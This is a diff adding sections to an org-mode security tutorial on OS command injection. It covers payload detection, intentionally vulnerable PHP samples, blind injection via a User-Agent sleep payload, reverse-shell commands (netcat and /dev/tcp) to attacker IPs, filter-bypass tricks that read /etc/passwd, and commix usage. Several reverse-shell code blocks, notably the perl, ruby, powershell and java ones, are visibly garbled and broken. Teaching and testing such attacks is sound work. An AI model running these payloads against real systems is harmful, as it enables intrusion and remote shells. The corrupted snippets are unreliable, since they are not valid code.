@@ -62,3 +62,235 @@ If an attacker adds ?cmd=ls to the URL, they can see the list of files on the se
 A DNS Lookup application that queries DNS records and displays the result on the screen is being examined.
 
 [[./imgs/dnslook.png]]
+
+A trial is made with the ; whoami payload in the address input field. Here, the ; operator ensures that the command within the payload runs after the system commands within the application finish executing.
+
+[[./imgs/detect.png]]
+
+whoami is used to determine the username under which the application is running, which is seen as www-data.
+
+www-data is typically a user with limited permissions reserved for web server software, used for security purposes in web applications.
+
+At this stage, various types of payloads can be tried: ; whoami, google.com; whoami, | whoami, && whoami, || whoami
+
+Here, the ; ls payload uses the ls command to list files and directories within the current directory.
+
+*vulnerable code* ->
+#+begin_src php
+<?php
+  if (isset($_POST['query'])) {
+    $query = $_POST['query'];
+
+    $command = "nslookup $query"; // Vulnerable
+    exec($command, $output); // Vulnerable
+
+    if (!empty($output)) {
+      echo '<div class="mt-3 mb-5 p-4" style="background-color:#f7f7f9;border-radius:13px;">';
+
+      foreach ($output as $line) {
+        echo '<code>' . htmlspecialchars($line) . '</code><br>';
+      }
+
+      echo '</div>';
+    }
+  }
+?>
+#+end_src
+
+In this code, the query parameter obtained via the POST method is used directly in the nslookup command without any security measures.
+
+ If a command like google.com; whoami is sent as the "query" parameter, it can execute on the operating system, leading to potential harm.
+
+ Secure options will be done with the escapeshellarg() function
+
+* blind command injection
+Blind Command Injection is a type of attack where the attacker cannot directly see the output of the executed command. Instead, they infer the success or failure of the command execution through other means, such as server response time, error messages, or external actions.
+
+*example scenario* ->
+#+begin_src php
+<?php
+
+$host = $_GET['host'];
+
+$ping_result = shell_exec("ping -c 1 " . $host);
+
+if (strpos($ping_result, '1 packets received') !== false) {
+    echo "Host is accessible!";
+} else {
+    echo "Host is unreachable!";
+}
+?>
+#+end_src
+
+This PHP code takes the host parameter from an HTTP request via $_GET and uses the shell_exec function to execute a ping command with this input on the operating system.
+
+Since the user input is not validated, it is vulnerable to command injection attacks.
+
+An attacker can append a ~; sleep 10~ command to manipulate the server's response time. If the server takes 10 seconds to respond, the attacker knows that the command has been executed.
+
+*EXAMPLE*
+A web application that stores the User Agent information of the browser for keeping visitor records is under investigation.
+
+Considering that this information might be taken from the User-Agent header, which attackers can manipulate, the presence of a Command Injection vulnerability is evaluated.
+
+First, the application’s homepage is visited, and a message indicating that the User Agent information is stored is observed.
+
+[[./imgs/usera.png]]
+
+It can be seen that any Command Injection payload sent and the result of the shell command (whoami, hostname, ls) are not reflected in the content.
+
+For this web application, the response time of a standard HTTP request is 176 millis or 176 milliseconds as observed from a request.
+
+*payload at user-agent header* ->
+
+[[./imgs/dtc.png]]
+
+*payload* ->
+: User-Agent: '; sleep 10'
+
+In the detection phase, the User-Agent header will be manipulated. The browser information is removed. To increase response time, the sleep command, which halts the process for a specified duration, is used.
+
+The payload '; sleep 10' is crafted with quote marks at the beginning and end to close an existing quote in the software.
+
+The ; operator ensures that the command within the payload runs after the system commands within the application finish executing. Various payload types containing quotes or other special characters can be tested at this stage.
+
+The guesswork suggests that there might be a code like running in the background ->
+: "echo '$userAgent' >> ./logs/user_agent.log"
+
+When the payload is executed in the code, it would look like this ->
+: "echo ' '; sleep 10' ' >> ./logs/user_agent.log"
+
+*vulnerable code* ->
+#+begin_src php
+<?php
+  $userAgent = $_SERVER['HTTP_USER_AGENT'];
+
+  $command = "echo '$userAgent' >> ./logs/user_agent.log";
+
+  exec($command);
+?>
+#+end_src
+
+This code snippet takes the client's User-Agent header and appends it to a file using an echo command executed on the operating system. Since it executes user input as a shell command, it is vulnerable to command injection.
+
+* getting a reverse shell with command injection
+Command Injection attacks allow attackers to execute commands on a system, potentially enabling them to obtain a Reverse Shell on the target system.
+
+[[./imgs/reverse_shell.png]]
+
+To obtain a Reverse Shell, the attacker must execute a command on the target system that starts a shell (command line interpreter) and connects to the attacker's controlled server.
+
+The attacker typically uses a listener server and waits for the shell program on the target system to establish the connection.
+
+*example* ->
+: google.com ; nc -e /bin/sh 192.168.1.10 4444
+
+This command sends the command before the ; to the target system and then utilizes the nc command to obtain a Reverse Shell. The "nc" command or Netcat, uses the "/bin/sh" shell (or similar bash shell) to connect back to the server at 192.168.1.10 on port 4444.
+
+*listening* ->
+: nc -lvp 4444
+
+Once the payload is sent to the target system, the attacker waits for the connection to reach the listening server.
+
+** alternativa reverse shell payloads
+: ; nc -e /bin/bash 172.20.1.145 4444
+
+: ; bash -c 'bash -i >& /dev/tcp/172.20.1.145/4444 0>&1'
+- bash -c : Runs the provided command using the -c (command) option of bash.
+- 'bash -i >& /dev/tcp/.../4444 0>&1' : Creates an interactive bash shell and redirects Ie/O:
+- bash -i : Spawns an interactive bash shell >& /dev/tcp/172.20.1.145/4444 : Redirects standard output (stdout)
+
+** generating reverse shell payloads
+Using payload generator tools can be beneficial for these types of attacks. For example:
+https://www.revshells.com
+
+** bash
+: bash -i >& /dev/tcp/172.20.1.145/4444 0>&1
+
+** python
+#+begin_src python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,sock.SOCK_STREAM.os.connect(("172.20.1.145",4444));os.dup2(s.client_fileno(),0); os.dup2(s.client_fileno(),1); os.dup2(s.client_fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+#+end_src
+
+** perl
+#+begin_src perl
+perl -e 'use Socket;$= "172.20.1.145; =4444;socket(S,PF_INET,SOCK_STREAM,getby_idc_chars("Tcp"));if(connect(S,sockaddr.("Plxp4.utfatossf; !x)&&=tf9fec(@ipv_pl_TE_(inputs), plt E);;&
+#+end_src
+
+** php
+#+begin_src php
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.20.1.145/4444 0>&1'"); ?>
+#+end_src
+
+** ruby
+#+begin_src ruby
+ruby-liftc.- s=744g))
+fd=TCPSocket.open("172l.9")).to_i;exec 'sprintf("/bin/sh -i <&5.0)&5.2>5",f,f,df)S)
+#+end_src
+
+** powershell
+#+begin_src powershell
+powershell -c rival=$client = ....7180V4_$$client9 open("172.20.1.145");$stream= = elf.]$bytes=..ticks)$ev.;bytes.length=);.)while- $ases -.Name "- aysiiREBoundingClientRect..0'{8;client_Close());}}
+#+end_src
+
+** java
+#+begin_src java
+Runtime.getRuntime().exec(new. .socket[]{"bash", -c","exec t<.client.cc/_/tm/rv ครั้ง! '&..& '"])
+#+end_src
+
+* bypass techniques
+In applications with Command Injection vulnerabilities, it may not always be possible to execute desired commands or exploit the vulnerability due to implemented filters or validations.
+
+** removing whitespace characters
+Some filters may block space characters between commands. In this case, alternative characters or methods can be used to execute commands.
+
+*bypass with $IFS* ->
+: ls${IFS}/etc/passwd
+
+** using single and double quotes
+When filters block certain keywords or commands, single and double quotes can be used to bypass these restrictions.
+
+*bypass using single quotes* ->
+: w'h'o'am'i
+
+*bypass using double quotes* ->
+: w"h"o"am"i
+
+*bypass using backticks* ->
+: wh``oami
+
+** udinh $() and backticks
+Subcommands can be executed using ~$()~ or ~`~. These methods allow special characters inside commands to be executed.
+
+*bypass with $()* ->
+: who$()ami
+
+*bypass with backticks* ->
+: who`echo am`i
+
+** using multiple commands
+Multiple commands can be used to bypass filters. In a command sequence, using an unfiltered character can execute another command.
+
+*bypass using ;* ->
+: google.com ; cat /etc/passwd
+
+*bypass using ||* ->
+: || cat /etc/passwd
+
+* command injection scanning tools
+*commix* ->
+Commix (Command Injection Exploiter) is an automated tool used for detecting and exploiting Command Injection vulnerabilities in web applications. It is highly useful for security researchers and penetration testers.
+
+[[./imgs/commix.png]]
+
+*installation* ->
+: git clone https://github.com/commixproject/commix.git commix
+
+*basic usage* ->
+: python commix.py --url="http://example.com/index.php"
+
+*specify data parameter* ->
+: python commix.py --url="http://example.com/index.php" --data="command=test"
+
+*request method* ->
+: python commix.py --url="http://example.com/index.php" --method=POST
